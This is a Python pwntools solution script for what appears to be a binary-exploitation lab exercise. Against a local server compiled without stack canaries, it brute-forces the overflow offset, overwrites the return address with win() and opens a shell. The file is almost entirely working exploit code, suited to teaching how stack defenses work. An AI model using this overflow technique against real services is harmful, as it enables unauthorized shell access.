#!/usr/bin/env python3
"""Solution for Problem 5: canary_server built with NO canary (baseline).

Same forking server as Problems 7 and 8, but compiled with
`-fno-stack-protector` (binary: canary_server_nc). With no canary in the way,
a single overflow reaches the return address, so we jump straight to the
existing win() -- no brute force, no shellcode. This is the "before defenses"
baseline; Problems 7 and 8 add the canary (and, in 8, NX) to this same server.

Oracle: the child prints "OK" only when handle() returns. Grow an all-'A' fill
until "OK" disappears to find the distance from buf to the return address.

Start the server first (from the example3 directory):
    ./canary_server_nc &          # 127.0.0.1:4004
Then run:
    python3 solution3/solve_csrv_nocanary.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="warn")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "canary_server_nc")
HOST, PORT = "127.0.0.1", 4004

elf = ELF(BIN, checksec=False)


def survives(payload):
    """Send payload on a fresh connection; True if the child returned ('OK')."""
    io = remote(HOST, PORT)
    io.send(payload)
    try:
        data = io.recvall(timeout=1)
    except EOFError:
        data = b""
    io.close()
    return b"OK" in data


def find_offset():
    """Largest all-'A' fill that still returns OK == distance buf -> return addr."""
    n = 1
    while survives(b"A" * n):
        n += 1
    off = n - 1
    log.warn("offset(buf -> return address) = %d", off)
    return off


def main():
    offset = find_offset()
    payload = b"A" * offset + p32(elf.symbols["win"])   # no canary to preserve

    io = remote(HOST, PORT)
    io.send(payload)
    io.recvuntil(b"win! spawning shell")
    log.success("no canary -> straight ret2win -- shell open")
    io.sendline(b"id; echo NOCANARY_PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
